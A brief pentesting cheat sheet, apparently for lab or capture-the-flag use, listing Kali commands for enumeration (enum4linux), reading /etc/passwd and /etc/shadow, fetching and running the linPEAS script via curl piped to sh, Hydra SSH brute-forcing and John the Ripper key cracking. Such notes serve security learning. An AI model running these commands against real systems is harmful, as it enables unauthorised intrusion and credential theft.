# Kali  

## Enum
```
# Gobuster
```

```sh
#enum4linux
/opt/enum4linux/enum4linux.pl -a $target_ip | tee enum4linux.log
```

```sh
# Basic poking around
cat /etc/passwd /etc/shadow
compgen -A function -abck
```
[Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`


## Password Cracking
```sh
# Hydra
hydra -l $username -P /opt/rockyou.txt ssh://$target_ip
```
```sh
#Jonh the Ripper
/opt/JohnTheRipper/run/ssh2john.py $rsakeyfilepath > forjohn.txt
/opt/JohnTheRipper/run/john --wordlist=/opt/rockyou.txt
```